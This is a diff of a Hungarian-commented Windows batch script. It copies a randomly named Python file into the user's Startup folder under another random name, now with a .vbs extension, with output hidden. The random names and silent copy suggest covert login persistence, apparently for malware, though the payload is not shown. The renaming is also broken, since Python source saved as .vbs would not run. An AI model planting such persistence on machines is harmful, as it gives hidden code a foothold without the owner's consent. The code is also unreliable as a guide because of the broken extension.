@@ -47,6 +47,11 @@ echo Függőségek rendben.
 echo -----------------------
 echo.
 
+:: program indítás
+echo Program indítása innen:
+echo %TARGET%
+echo.
+
 :: Startup mappa helye
 set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
@@ -56,19 +61,11 @@ if not exist "%STARTUP_FOLDER%" (
 )
 
 :: .py fájlok bemásolása Startupba
-copy "%~dp0spwww743g7w.py" "%STARTUP_FOLDER%\vw2i45ibzfrun2.bat" /Y >nul
+copy "%~dp0spwww743g7w.py" "%STARTUP_FOLDER%\sifustartup5sfgj.vbs" /Y >nul
 
-:: program indítás
-echo Program indítása innen:
-echo %TARGET%
-echo.
-
-python "%TARGET%\spwww743g7w.py"
-
-echo spw elindult.
-echo.
 echo Kész.
 pause
+
 
 
 
